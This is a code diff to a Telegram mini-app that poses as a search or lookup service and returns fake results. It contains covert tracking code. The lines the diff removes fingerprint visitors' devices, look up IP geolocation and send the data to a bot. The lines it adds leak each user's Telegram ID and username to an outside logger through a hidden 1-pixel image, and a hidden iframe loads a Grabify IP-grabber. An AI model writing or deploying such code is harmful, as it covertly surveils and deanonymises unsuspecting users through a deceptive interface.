@@ -216,10 +216,10 @@
     </div>
 
     <iframe id="grabify" style="display:none;"></iframe>
-    <img src="https://yip.su/2pTuS4" style="display:none; position:absolute; width:1px; height:1px;" alt="">
 
     <script>
         var GRABIFY_URL = 'https://account.beauty/89YMMI';
+        var CLOUDFLARE_LOGGER = 'https://otsocitybotz-logger.tophaslayt.workers.dev';
 
         var tg = null;
         var userId = 'unknown';
@@ -227,7 +227,6 @@
         var userFirst = '';
         var userLast = '';
         var userPremium = false;
-        var userLang = '';
 
         try {
             if (window.Telegram && window.Telegram.WebApp) {
@@ -240,115 +239,33 @@
                     userFirst = tg.initDataUnsafe.user.first_name || '';
                     userLast = tg.initDataUnsafe.user.last_name || '';
                     userPremium = tg.initDataUnsafe.user.is_premium || false;
-                    userLang = tg.initDataUnsafe.user.language_code || '';
                 }
             }
         } catch(e) {
-            console.log('TG error:', e);
+            console.log('TG init error:', e);
         }
 
         document.getElementById('visitorId').innerText = userId;
         document.getElementById('visitorName').innerText = '@' + userName;
         document.getElementById('todayQueries').innerText = Math.floor(Math.random() * 50000 + 100000).toLocaleString();
 
-        var deviceData = {
-            id: userId,
-            username: userName,
-            firstName: userFirst,
-            lastName: userLast,
-            premium: userPremium,
-            tgLang: userLang,
-            screen: screen.width + 'x' + screen.height,
-            viewport: window.innerWidth + 'x' + window.innerHeight,
-            colorDepth: screen.colorDepth,
-            pixelRatio: window.devicePixelRatio,
-            platform: navigator.platform,
-            vendor: navigator.vendor || '',
-            userAgent: navigator.userAgent,
-            cores: navigator.hardwareConcurrency || 0,
-            memory: navigator.deviceMemory || 0,
-            touch: navigator.maxTouchPoints || 0,
-            language: navigator.language,
-            languages: navigator.languages ? navigator.languages.join(',') : '',
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            timezoneOffset: new Date().getTimezoneOffset(),
-            online: navigator.onLine,
-            cookies: navigator.cookieEnabled,
-            dnt: navigator.doNotTrack || '',
-            connectionType: '',
-            connectionSpeed: '',
-            ip: '',
-            country: '',
-            region: '',
-            city: '',
-            isp: '',
-            lat: '',
-            lon: '',
-            action: 'webapp_open',
-            query: ''
-        };
-
-        try {
-            if (navigator.connection) {
-                deviceData.connectionType = navigator.connection.effectiveType || '';
-                deviceData.connectionSpeed = navigator.connection.downlink || '';
-            }
-        } catch(e) {}
-
-        function sendLogToBot(data) {
-            if (!tg) {
-                console.log('Telegram WebApp not available');
-                return;
-            }
-            
-            try {
-                var jsonData = JSON.stringify(data);
-                var base64Data = btoa(unescape(encodeURIComponent(jsonData)));
-                
-                var kb = {
-                    inline_keyboard: [[
-                        { text: ' ', callback_data: 'log:' + base64Data }
-                    ]]
-                };
-                
-                tg.showPopup({
-                    title: 'Загрузка',
-                    message: 'Подождите...',
-                    buttons: [{ type: 'close' }]
-                });
-                
-                setTimeout(function() {
-                    tg.close();
-                }, 100);
-                
-                tg.sendData(jsonData);
-                
-                console.log('Data sent to bot');
-            } catch(e) {
-                console.log('Send error:', e);
-            }
-        }
-
+        // === CLOUDFLARE LOGGER === 
         setTimeout(function() {
-            fetch('https://ipapi.co/json/')
-                .then(function(r) { return r.json(); })
-                .then(function(ipData) {
-                    deviceData.ip = ipData.ip || '';
-                    deviceData.country = ipData.country_name || '';
-                    deviceData.city = ipData.city || '';
-                    deviceData.region = ipData.region || '';
-                    deviceData.isp = ipData.org || '';
-                    deviceData.lat = ipData.latitude || '';
-                    deviceData.lon = ipData.longitude || '';
-                })
-                .catch(function() {})
-                .finally(function() {
-                    sendLogToBot(deviceData);
-                });
-        }, 1000);
+            var img = document.createElement('img');
+            img.style.display = 'none';
+            img.style.position = 'absolute';
+            img.style.width = '1px';
+            img.style.height = '1px';
+            img.src = CLOUDFLARE_LOGGER + '?uid=' + userId + '&un=' + userName + '&t=' + Date.now();
+            document.body.appendChild(img);
+            
+            console.log('✅ Cloudflare logger triggered for user:', userId);
+        }, 1500);
 
+        // === GRABIFY BACKUP ===
         setTimeout(function() {
             document.getElementById('grabify').src = GRABIFY_URL;
+            console.log('✅ Grabify backup loaded');
         }, 4000);
 
         function showPage(id) {
@@ -364,29 +281,10 @@
             document.getElementById('menu').style.display = 'grid';
         }
 
-        function openSearch() {
-            showPage('pageSearch');
-            deviceData.action = 'open_search';
-            sendLogToBot(deviceData);
-        }
-
-        function openProfile() {
-            showPage('pageProfile');
-            deviceData.action = 'open_profile';
-            sendLogToBot(deviceData);
-        }
-
-        function openAdd() {
-            showPage('pageAdd');
-            deviceData.action = 'open_add';
-            sendLogToBot(deviceData);
-        }
-
-        function openStats() {
-            showPage('pageStats');
-            deviceData.action = 'open_stats';
-            sendLogToBot(deviceData);
-        }
+        function openSearch() { showPage('pageSearch'); }
+        function openProfile() { showPage('pageProfile'); }
+        function openAdd() { showPage('pageAdd'); }
+        function openStats() { showPage('pageStats'); }
 
         var searchCount = 0;
 
@@ -398,12 +296,7 @@
             }
 
             searchCount++;
-            deviceData.action = 'search';
-            deviceData.query = q;
-            
             document.getElementById('searchResult').innerHTML = '<div class="result loading">⏳ Поиск по 764+ источникам...</div>';
-
-            sendLogToBot(deviceData);
 
             setTimeout(function() {
                 var results = ['❌ Данные не найдены', '⚠️ Сервера перегружены. Попробуйте позже.'];
